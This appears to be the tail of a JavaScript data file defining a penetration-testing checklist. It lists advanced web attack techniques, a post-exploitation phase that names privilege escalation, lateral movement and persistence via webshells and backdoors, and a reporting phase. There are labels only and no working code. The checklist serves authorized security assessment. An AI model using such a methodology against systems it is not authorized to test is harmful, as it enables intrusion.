          { id: "adv_cache_poison", label: "Web Cache Poisoning — Unkeyed headers/parameters" },
          { id: "adv_cache_decept", label: "Web Cache Deception — Cache sensitive pages" },
          { id: "adv_proto_pollution", label: "Prototype Pollution — Client/Server-side code execution" },
          { id: "adv_host_header", label: "Host Header Injection — Password reset poisoning, SSRF" },
          { id: "adv_request_smuggle", label: "HTTP/2 Smuggling — H2.CL, H2.TE, CL.0" },
          { id: "adv_race_condition", label: "Race Conditions — Turbo Intrutor concurrent testing" },
          { id: "adv_clickjacking", label: "Clickjacking — UI redressing with iframes" },
          { id: "adv_tabnabbing", label: "Tabnabbing — Reverse tabnabbing via window.opener" },
        ]
      }
    ]
  },
  {
    id: "web_phase12", icon: "fas fa-chart-bar", label: "PHASE 12: Post-Exploitation & Reporting", severity: "info",
    children: [
      {
        id: "web12_post_exploit", label: "Post-Exploitation Assessment", children: [
          { id: "post_data_access", label: "Data Access Scope — All accessible data after compromise" },
          { id: "post_priv_escalation", label: "Privilege Escalation Path — Initial access to higher privileges" },
          { id: "post_lateral_move", label: "Lateral Movement — Access to other systems from compromised position" },
          { id: "post_persistence", label: "Persistence — Webshells, backdoors, cron jobs" },
          { id: "post_impact", label: "Business Impact — Damage potential quantification" },
        ]
      },
      {
        id: "web12_reporting", label: "Documentation & Reporting", children: [
          { id: "report_evidence", label: "Evidence Collection — Screenshots, request/response pairs, PoC" },
          { id: "report_severity", label: "Severity Rating — CVSS scoring, business impact" },
          { id: "report_reproduction", label: "Reproduction Steps — Clear step-by-step instructions" },
          { id: "report_remediation", label: "Remediation — Specific, actionable fixes" },
          { id: "report_exec_summary", label: "Executive Summary — Non-technical overview" },
          { id: "report_retest", label: "Retesting — Verify fixes after remediation" },
        ]
      }
    ]
  }
];
